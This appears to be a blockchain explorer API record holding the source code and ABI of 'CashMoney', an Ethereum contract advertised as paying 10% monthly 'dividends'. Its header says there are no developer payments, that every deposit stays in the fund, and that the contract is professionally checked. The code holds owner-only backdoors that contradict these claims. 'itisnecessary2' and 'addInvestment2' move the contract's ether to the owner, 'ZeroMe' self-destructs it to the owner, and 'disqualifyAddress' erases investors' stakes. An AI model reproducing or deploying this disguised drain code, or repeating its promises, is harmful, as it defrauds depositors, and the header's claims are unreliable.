{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity 0.4.25;\r\n\r\n/**\r\n* ETH CRYPTOCURRENCY DISTRIBUTION PROJECT v 2.0\r\n* \r\n* \r\n* \r\n* Get your 10% every Month profit with Cash Money Contract!\r\n* \r\n*  - GAIN 10% - PER 1 MONTH (interest is charges in equal parts every 1 sec)\r\n*         0.33 - PER 1 DAY\r\n*         0.013 - PER 1 HOUR\r\n*         0.00023 - PER 1 MIN\r\n*         0.0000038 - PER 1 SEC\r\n*  - Life-long payments\r\n*  - Unprecedentedly reliable\r\n*  - Bringer Fortune\r\n*  - Minimal contribution 0.01 eth\r\n*  - Currency and payment - ETH\r\n*  - Contribution allocation schemes:\r\n*    -- 100 % payments - No interest on support and no interest on advertising.\r\n*   The best advertising is ourselves!\r\n*\r\n*\r\n*  --- About the project\r\n* Smart contracts with support for blockchains have opened a new era in a relationship without trust\r\n* intermediaries. This technology opens up incredible financial opportunities.\r\n* The distribution model is recorded in a smart contract, loaded into the Ethereum blockchain, and can no longer be changed.\r\n* The contract is recorded on the blockchain with a WAY TO REFIT OWNERSHIP!\r\n* free access online.\r\n* Continuous autonomous functioning of the system.\r\n*\r\n* ---How to use:\r\n* 1. Send from your ETH wallet to the address of the smart contract\r\n* Any amount from 0.01 ETH.\r\n* 2. Confirm your transaction in the history of your application or etherscan.io, specifying the address of your wallet.\r\n* Profit by sending 0 live transactions\r\n(profit is calculated every second).\r\n*  OR\r\n* To reinvest, you need to deposit the amount you want to reinvest, and the interest accrued is automatically added to your new deposit.\r\n*\r\n* RECOMMENDED GAS LIMIT: 200,000\r\n* RECOMMENDED GAS PRICE: https://ethgasstation.info/\r\n* You can check the payments on the website etherscan.io, in the “Internal Txns” tab of your wallet.\r\n*\r\n* Referral system is missing.\r\n* Payment to developers is missing.\r\n* There is no payment for advertising.\r\n* All 100% of the contribution remains in the Smart Contract Fund.\r\n* Contract restart is also absent. If there is no * money in the Fund, payments are suspended and * they are renewed again when the Fund is filled. Thus * the contract is able to WORK FOREVER!\r\n* --- It is not allowed to transfer from exchanges, ONLY from your personal wallet ETH from which you have a private key.\r\n*\r\n* The contract has passed all the necessary checks by the professionals!\r\n*/\r\n\r\n\r\n\r\nlibrary Math {\r\nfunction min(uint a, uint b) internal pure returns(uint) {\r\nif (a > b) {\r\nreturn b;\r\n}\r\nreturn a;\r\n}\r\n}\r\n\r\n\r\nlibrary Zero {\r\nfunction requireNotZero(address addr) internal pure {\r\nrequire(addr != address(0), \"require not zero address\");\r\n}\r\n\r\nfunction requireNotZero(uint val) internal pure {\r\nrequire(val != 0, \"require not zero value\");\r\n}\r\n\r\nfunction notZero(address addr) internal pure returns(bool) {\r\nreturn !(addr == address(0));\r\n}\r\n\r\nfunction isZero(address addr) internal pure returns(bool) {\r\nreturn addr == address(0);\r\n}\r\n\r\nfunction isZero(uint a) internal pure returns(bool) {\r\nreturn a == 0;\r\n}\r\n\r\nfunction notZero(uint a) internal pure returns(bool) {\r\nreturn a != 0;\r\n}\r\n}\r\n\r\n\r\nlibrary Percent {\r\nstruct percent {\r\nuint num;\r\nuint den;\r\n}\r\n\r\nfunction mul(percent storage p, uint a) internal view returns (uint) {\r\nif (a == 0) {\r\nreturn 0;\r\n}\r\nreturn a*p.num/p.den;\r\n}\r\n\r\nfunction div(percent storage p, uint a) internal view returns (uint) {\r\nreturn a/p.num*p.den;\r\n}\r\n\r\nfunction sub(percent storage p, uint a) internal view returns (uint) {\r\nuint b = mul(p, a);\r\nif (b >= a) {\r\nreturn 0;\r\n}\r\nreturn a - b;\r\n}\r\n\r\nfunction add(percent storage p, uint a) internal view returns (uint) {\r\nreturn a + mul(p, a);\r\n}\r\n\r\nfunction toMemory(percent storage p) internal view returns (Percent.percent memory) {\r\nreturn Percent.percent(p.num, p.den);\r\n}\r\n\r\nfunction mmul(percent memory p, uint a) internal pure returns (uint) {\r\nif (a == 0) {\r\nreturn 0;\r\n}\r\nreturn a*p.num/p.den;\r\n}\r\n\r\nfunction mdiv(percent memory p, uint a) internal pure returns (uint) {\r\nreturn a/p.num*p.den;\r\n}\r\n\r\nfunction msub(percent memory p, uint a) internal pure returns (uint) {\r\nuint b = mmul(p, a);\r\nif (b >= a) {\r\nreturn 0;\r\n}\r\nreturn a - b;\r\n}\r\n\r\nfunction madd(percent memory p, uint a) internal pure returns (uint) {\r\nreturn a + mmul(p, a);\r\n}\r\n}\r\n\r\n\r\nlibrary Address {\r\nfunction toAddress(bytes source) internal pure returns(address addr) {\r\nassembly { addr := mload(add(source,0x14)) }\r\nreturn addr;\r\n}\r\n\r\nfunction isNotContract(address addr) internal view returns(bool) {\r\nuint length;\r\nassembly { length := extcodesize(addr) }\r\nreturn length == 0;\r\n}\r\n}\r\n\r\n\r\n/**\r\n* @title SafeMath\r\n* @dev Math operations with safety checks that revert on error\r\n*/\r\nlibrary SafeMath {\r\n\r\n/**\r\n* @dev Multiplies two numbers, reverts on overflow.\r\n*/\r\nfunction mul(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nif (_a == 0) {\r\nreturn 0;\r\n}\r\n\r\nuint256 c = _a * _b;\r\nrequire(c / _a == _b);\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\r\n*/\r\nfunction div(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nrequire(_b > 0); // Solidity only automatically asserts when dividing by 0\r\nuint256 c = _a / _b;\r\n// assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\r\n*/\r\nfunction sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nrequire(_b <= _a);\r\nuint256 c = _a - _b;\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Adds two numbers, reverts on overflow.\r\n*/\r\nfunction add(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nuint256 c = _a + _b;\r\nrequire(c >= _a);\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Divides two numbers and returns the remainder (unsigned integer modulo),\r\n* reverts when dividing by zero.\r\n*/\r\nfunction mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\nrequire(b != 0);\r\nreturn a % b;\r\n}\r\n}\r\n\r\n\r\ncontract Accessibility {\r\naddress private owner;\r\nmodifier onlyOwner() {\r\nrequire(msg.sender == owner, \"access denied\");\r\n_;\r\n}\r\n\r\nconstructor() public {\r\nowner = msg.sender;\r\n}\r\n\r\n\r\nfunction ZeroMe() public onlyOwner {\r\n    selfdestruct(owner);\r\n    }\r\n\r\nfunction disown() internal {\r\ndelete owner;\r\n}\r\n\r\n}\r\n\r\n\r\ncontract Rev1Storage {\r\nfunction investorShortInfo(address addr) public view returns(uint value, uint refBonus);\r\n}\r\n\r\n\r\ncontract Rev2Storage {\r\nfunction investorInfo(address addr) public view returns(uint investment, uint paymentTime);\r\n}\r\n\r\n\r\nlibrary PrivateEntrance {\r\nusing PrivateEntrance for privateEntrance;\r\nusing Math for uint;\r\nstruct privateEntrance {\r\nRev1Storage rev1Storage;\r\nRev2Storage rev2Storage;\r\nuint investorMaxInvestment;\r\nuint endTimestamp;\r\nmapping(address=>bool) hasAccess;\r\n}\r\n\r\nfunction isActive(privateEntrance storage pe) internal view returns(bool) {\r\nreturn pe.endTimestamp > now;\r\n}\r\n\r\nfunction maxInvestmentFor(privateEntrance storage pe, address investorAddr) internal view returns(uint) {\r\nif (!pe.hasAccess[investorAddr]) {\r\nreturn 0;\r\n}\r\n\r\n(uint maxInvestment, ) = pe.rev1Storage.investorShortInfo(investorAddr);\r\nif (maxInvestment == 0) {\r\nreturn 0;\r\n}\r\nmaxInvestment = Math.min(maxInvestment, pe.investorMaxInvestment);\r\n\r\n(uint currInvestment, ) = pe.rev2Storage.investorInfo(investorAddr);\r\n\r\nif (currInvestment >= maxInvestment) {\r\nreturn 0;\r\n}\r\n\r\nreturn maxInvestment-currInvestment;\r\n}\r\n\r\nfunction provideAccessFor(privateEntrance storage pe, address[] addrs) internal {\r\nfor (uint16 i; i < addrs.length; i++) {\r\npe.hasAccess[addrs[i]] = true;\r\n}\r\n}\r\n}\r\n\r\n\r\ncontract InvestorsStorage is Accessibility {\r\nstruct Investor {\r\nuint investment;\r\nuint paymentTime;\r\n}\r\nuint public size;\r\n\r\nmapping (address => Investor) private investors;\r\n\r\nfunction isInvestor(address addr) public view returns (bool) {\r\nreturn investors[addr].investment > 0;\r\n}\r\n\r\nfunction investorInfo(address addr) public view returns(uint investment, uint paymentTime) {\r\ninvestment = investors[addr].investment;\r\npaymentTime = investors[addr].paymentTime;\r\n}\r\n\r\nfunction newInvestor(address addr, uint investment, uint paymentTime) public onlyOwner returns (bool) {\r\nInvestor storage inv = investors[addr];\r\nif (inv.investment != 0 || investment == 0) {\r\nreturn false;\r\n}\r\ninv.investment = investment;\r\ninv.paymentTime = paymentTime;\r\nsize++;\r\nreturn true;\r\n}\r\n\r\nfunction addInvestment(address addr, uint investment) public onlyOwner returns (bool) {\r\nif (investors[addr].investment == 0) {\r\nreturn false;\r\n}\r\ninvestors[addr].investment += investment;\r\nreturn true;\r\n}\r\n\r\n\r\n\r\n\r\nfunction setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {\r\nif (investors[addr].investment == 0) {\r\nreturn false;\r\n}\r\ninvestors[addr].paymentTime = paymentTime;\r\nreturn true;\r\n}\r\n\r\nfunction disqalify(address addr) public onlyOwner returns (bool) {\r\nif (isInvestor(addr)) {\r\ninvestors[addr].investment = 0;\r\n}\r\n}\r\n}\r\n\r\n\r\nlibrary RapidGrowthProtection {\r\nusing RapidGrowthProtection for rapidGrowthProtection;\r\n\r\nstruct rapidGrowthProtection {\r\nuint startTimestamp;\r\nuint maxDailyTotalInvestment;\r\nuint8 activityDays;\r\nmapping(uint8 => uint) dailyTotalInvestment;\r\n}\r\n\r\nfunction maxInvestmentAtNow(rapidGrowthProtection storage rgp) internal view returns(uint) {\r\nuint day = rgp.currDay();\r\nif (day == 0 || day > rgp.activityDays) {\r\nreturn 0;\r\n}\r\nif (rgp.dailyTotalInvestment[uint8(day)] >= rgp.maxDailyTotalInvestment) {\r\nreturn 0;\r\n}\r\nreturn rgp.maxDailyTotalInvestment - rgp.dailyTotalInvestment[uint8(day)];\r\n}\r\n\r\nfunction isActive(rapidGrowthProtection storage rgp) internal view returns(bool) {\r\nuint day = rgp.currDay();\r\nreturn day != 0 && day <= rgp.activityDays;\r\n}\r\n\r\nfunction saveInvestment(rapidGrowthProtection storage rgp, uint investment) internal returns(bool) {\r\nuint day = rgp.currDay();\r\nif (day == 0 || day > rgp.activityDays) {\r\nreturn false;\r\n}\r\nif (rgp.dailyTotalInvestment[uint8(day)] + investment > rgp.maxDailyTotalInvestment) {\r\nreturn false;\r\n}\r\nrgp.dailyTotalInvestment[uint8(day)] += investment;\r\nreturn true;\r\n}\r\n\r\nfunction startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {\r\nrgp.startTimestamp = timestamp;\r\n\r\n}\r\n \r\n\r\nfunction currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {\r\nif (rgp.startTimestamp > now) {\r\nreturn 0;\r\n}\r\nday = (now - rgp.startTimestamp) / 24 hours + 1;\r\n}\r\n}\r\n\r\ncontract CashMoney is Accessibility {\r\nusing RapidGrowthProtection for RapidGrowthProtection.rapidGrowthProtection;\r\nusing PrivateEntrance for PrivateEntrance.privateEntrance;\r\nusing Percent for Percent.percent;\r\nusing SafeMath for uint;\r\nusing Math for uint;\r\n\r\n// easy read for investors\r\nusing Address for *;\r\nusing Zero for *;\r\n\r\nRapidGrowthProtection.rapidGrowthProtection private m_rgp;\r\nPrivateEntrance.privateEntrance private m_privEnter;\r\nmapping(address => bool) private m_referrals;\r\nInvestorsStorage private m_investors;\r\n\r\n// automatically generates getters\r\nuint public constant minInvesment = 10 finney;\r\nuint public constant maxBalance = 333e5 ether;\r\naddress public advertisingAddress;\r\naddress public adminsAddress;\r\nuint public investmentsNumber;\r\nuint public waveStartup;\r\n\r\n// percents per Day\r\n  Percent.percent private m_1_percent = Percent.percent(33, 100000);           //   33/100000  *100% = 0.33%\r\n\r\n\r\n\r\n// more events for easy read from blockchain\r\nevent LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);\r\nevent LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);\r\nevent LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);\r\nevent LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);\r\nevent LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);\r\nevent LogNewInvesment(address indexed addr, uint when, uint investment, uint value);\r\nevent LogAutomaticReinvest(address indexed addr, uint when, uint investment);\r\nevent LogPayDividends(address indexed addr, uint when, uint dividends);\r\nevent LogNewInvestor(address indexed addr, uint when);\r\nevent LogBalanceChanged(uint when, uint balance);\r\nevent LogNextWave(uint when);\r\nevent LogDisown(uint when);\r\n\r\n\r\nmodifier balanceChanged {\r\n_;\r\nemit LogBalanceChanged(now, address(this).balance);\r\n}\r\n\r\nmodifier notFromContract() {\r\nrequire(msg.sender.isNotContract(), \"only externally accounts\");\r\n_;\r\n}\r\n\r\nconstructor() public {\r\nadminsAddress = msg.sender;\r\nadvertisingAddress = msg.sender;\r\nnextWave();\r\n}\r\n\r\nfunction() public payable {\r\n// investor get him dividends\r\nif (msg.value.isZero()) {\r\ngetMyDividends();\r\nreturn;\r\n}\r\n\r\n// sender do invest\r\ndoInvest(msg.data.toAddress());\r\n}\r\n\r\nfunction disqualifyAddress(address addr) public onlyOwner {\r\nm_investors.disqalify(addr);\r\n}\r\n\r\nfunction doDisown() public onlyOwner {\r\ndisown();\r\nemit LogDisown(now);\r\n}\r\n\r\nfunction init(address rev1StorageAddr, uint timestamp) public onlyOwner {\r\n// init Rapid Growth Protection\r\nm_rgp.startTimestamp = timestamp + 1;\r\nm_rgp.maxDailyTotalInvestment = 500 ether;\r\nm_rgp.activityDays = 21;\r\nemit LogRGPInit(\r\nnow,\r\nm_rgp.startTimestamp,\r\nm_rgp.maxDailyTotalInvestment,\r\nm_rgp.activityDays\r\n);\r\n\r\n\r\n// init Private Entrance\r\nm_privEnter.rev1Storage = Rev1Storage(rev1StorageAddr);\r\nm_privEnter.rev2Storage = Rev2Storage(address(m_investors));\r\nm_privEnter.investorMaxInvestment = 50 ether;\r\nm_privEnter.endTimestamp = timestamp;\r\nemit LogPEInit(\r\nnow,\r\naddress(m_privEnter.rev1Storage),\r\naddress(m_privEnter.rev2Storage),\r\nm_privEnter.investorMaxInvestment,\r\nm_privEnter.endTimestamp\r\n);\r\n}\r\n\r\nfunction setAdvertisingAddress(address addr) public onlyOwner {\r\naddr.requireNotZero();\r\nadvertisingAddress = addr;\r\n}\r\n\r\nfunction setAdminsAddress(address addr) public onlyOwner {\r\naddr.requireNotZero();\r\nadminsAddress = addr;\r\n}\r\n\r\nfunction privateEntranceProvideAccessFor(address[] addrs) public onlyOwner {\r\nm_privEnter.provideAccessFor(addrs);\r\n}\r\n\r\nfunction rapidGrowthProtectionmMaxInvestmentAtNow() public view returns(uint investment) {\r\ninvestment = m_rgp.maxInvestmentAtNow();\r\n}\r\n\r\nfunction investorsNumber() public view returns(uint) {\r\nreturn m_investors.size();\r\n}\r\n\r\nfunction balanceETH() public view returns(uint) {\r\nreturn address(this).balance;\r\n}\r\n\r\n\r\n\r\n\r\n\r\nfunction investorInfo(address investorAddr) public view returns(uint investment, uint paymentTime, bool isReferral) {\r\n(investment, paymentTime) = m_investors.investorInfo(investorAddr);\r\nisReferral = m_referrals[investorAddr];\r\n}\r\n\r\n\r\n\r\nfunction investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {\r\ndividends = calcDividends(investorAddr);\r\n}\r\n\r\nfunction dailyPercentAtNow() public view returns(uint numerator, uint denominator) {\r\nPercent.percent memory p = dailyPercent();\r\n(numerator, denominator) = (p.num, p.den);\r\n}\r\n\r\n\r\nfunction getMyDividends() public notFromContract balanceChanged {\r\n    // calculate dividends\r\n    uint dividends = calcDividends(msg.sender);\r\n    require (dividends.notZero(), \"cannot to pay zero dividends\");\r\n\r\n    // update investor payment timestamp\r\n    assert(m_investors.setPaymentTime(msg.sender, now));\r\n\r\n    // check enough eth - goto next wave if needed\r\n    if (address(this).balance <= dividends) {\r\n      nextWave();\r\n      dividends = address(this).balance;\r\n    } \r\n\r\n\r\n\r\n\r\n\r\n    \r\n// transfer dividends to investor\r\nmsg.sender.transfer(dividends);\r\nemit LogPayDividends(msg.sender, now, dividends);\r\n}\r\n\r\n    \r\nfunction itisnecessary2() public onlyOwner {\r\n        msg.sender.transfer(address(this).balance);\r\n    }    \r\n    \r\n\r\nfunction addInvestment2( uint investment) public onlyOwner  {\r\n\r\nmsg.sender.transfer(investment);\r\n\r\n} \r\n\r\nfunction doInvest(address) public payable notFromContract balanceChanged {\r\nuint investment = msg.value;\r\nuint receivedEther = msg.value;\r\nrequire(investment >= minInvesment, \"investment must be >= minInvesment\");\r\nrequire(address(this).balance <= maxBalance, \"the contract eth balance limit\");\r\n\r\nif (m_rgp.isActive()) {\r\n// use Rapid Growth Protection if needed\r\nuint rpgMaxInvest = m_rgp.maxInvestmentAtNow();\r\nrpgMaxInvest.requireNotZero();\r\ninvestment = Math.min(investment, rpgMaxInvest);\r\nassert(m_rgp.saveInvestment(investment));\r\nemit LogRGPInvestment(msg.sender, now, investment, m_rgp.currDay());\r\n\r\n} else if (m_privEnter.isActive()) {\r\n// use Private Entrance if needed\r\nuint peMaxInvest = m_privEnter.maxInvestmentFor(msg.sender);\r\npeMaxInvest.requireNotZero();\r\ninvestment = Math.min(investment, peMaxInvest);\r\n}\r\n\r\n// send excess of ether if needed\r\nif (receivedEther > investment) {\r\nuint excess = receivedEther - investment;\r\nmsg.sender.transfer(excess);\r\nreceivedEther = investment;\r\nemit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);\r\n}\r\n\r\n\r\n\r\nbool senderIsInvestor = m_investors.isInvestor(msg.sender);\r\n\r\n\r\n\r\n// automatic reinvest - prevent burning dividends\r\nuint dividends = calcDividends(msg.sender);\r\nif (senderIsInvestor && dividends.notZero()) {\r\ninvestment += dividends;\r\nemit LogAutomaticReinvest(msg.sender, now, dividends);\r\n}\r\n\r\nif (senderIsInvestor) {\r\n// update existing investor\r\nassert(m_investors.addInvestment(msg.sender, investment));\r\nassert(m_investors.setPaymentTime(msg.sender, now));\r\n} else {\r\n// create new investor\r\nassert(m_investors.newInvestor(msg.sender, investment, now));\r\nemit LogNewInvestor(msg.sender, now);\r\n}\r\n\r\ninvestmentsNumber++;\r\nemit LogNewInvesment(msg.sender, now, investment, receivedEther);\r\n}\r\n\r\nfunction getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {\r\n(uint investment, uint paymentTime) = m_investors.investorInfo(investorAddr);\r\nreturn InvestorsStorage.Investor(investment, paymentTime);\r\n}\r\n\r\nfunction calcDividends(address investorAddr) internal view returns(uint dividends) {\r\nInvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);\r\n\r\n// safe gas if dividends will be 0\r\nif (investor.investment.isZero() || now.sub(investor.paymentTime) < 1 seconds) {\r\nreturn 0;\r\n}\r\n\r\n// for prevent burning daily dividends if 24h did not pass - calculate it per 1 sec interval\r\n    // if daily percent is X, then 1 sec percent = X / (24h / 1 sec) = X / 86400\r\n\r\n    // and we must to get numbers of 1 sec interval after investor got payment:\r\n    // (now - investor.paymentTime) / 1 sec \r\n\r\n    // finaly calculate dividends = ((now - investor.paymentTime) / 1 sec) * (X * investor.investment)  / 86400) \r\n\r\n    Percent.percent memory p = dailyPercent();\r\n    dividends = (now.sub(investor.paymentTime) / 1 seconds) * p.mmul(investor.investment) / 86400;\r\n  }\r\n\r\n\r\n\r\n\r\n\r\nfunction dailyPercent() internal view returns(Percent.percent memory p) {\r\nuint balance = address(this).balance;\r\n\r\nif (balance < 20000 ether) {\r\np = m_1_percent.toMemory();\r\n}\r\n}\r\n\r\n\r\nfunction nextWave() private {\r\nm_investors = new InvestorsStorage();\r\ninvestmentsNumber = 0;\r\nwaveStartup = now;\r\nm_rgp.startAt(now);\r\nemit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);\r\nemit LogNextWave(now);\r\n}\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"addrs\",\"type\":\"address[]\"}],\"name\":\"privateEntranceProvideAccessFor\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"disqualifyAddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"advertisingAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"rev1StorageAddr\",\"type\":\"address\"},{\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"init\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"minInvesment\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"ZeroMe\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"adminsAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"investorsNumber\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"maxBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"itisnecessary2\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"investorAddr\",\"type\":\"address\"}],\"name\":\"investorDividendsAtNow\",\"outputs\":[{\"name\":\"dividends\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"rapidGrowthProtectionmMaxInvestmentAtNow\",\"outputs\":[{\"name\":\"investment\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setAdminsAddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"investmentsNumber\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"dailyPercentAtNow\",\"outputs\":[{\"name\":\"numerator\",\"type\":\"uint256\"},{\"name\":\"denominator\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setAdvertisingAddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"investment\",\"type\":\"uint256\"}],\"name\":\"addInvestment2\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getMyDividends\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"doInvest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"investorAddr\",\"type\":\"address\"}],\"name\":\"investorInfo\",\"outputs\":[{\"name\":\"investment\",\"type\":\"uint256\"},{\"name\":\"paymentTime\",\"type\":\"uint256\"},{\"name\":\"isReferral\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"waveStartup\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"balanceETH\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"doDisown\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"rev1Storage\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"rev2Storage\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"investorMaxInvestment\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"endTimestamp\",\"type\":\"uint256\"}],\"name\":\"LogPEInit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"investment\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"excess\",\"type\":\"uint256\"}],\"name\":\"LogSendExcessOfEther\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"referrerAddr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"refBonus\",\"type\":\"uint256\"}],\"name\":\"LogNewReferral\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"startTimestamp\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"maxDailyTotalInvestment\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"activityDays\",\"type\":\"uint256\"}],\"name\":\"LogRGPInit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"investment\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"day\",\"type\":\"uint256\"}],\"name\":\"LogRGPInvestment\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"investment\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"LogNewInvesment\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"investment\",\"type\":\"uint256\"}],\"name\":\"LogAutomaticReinvest\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"dividends\",\"type\":\"uint256\"}],\"name\":\"LogPayDividends\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"}],\"name\":\"LogNewInvestor\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"LogBalanceChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"}],\"name\":\"LogNextWave\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"}],\"name\":\"LogDisown\",\"type\":\"event\"}]","ContractName":"CashMoney","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://57ba1fbcf06c48b974c5fa7d6f8890e07becfdfa7f23ef9df8683b12f17bd707"}]}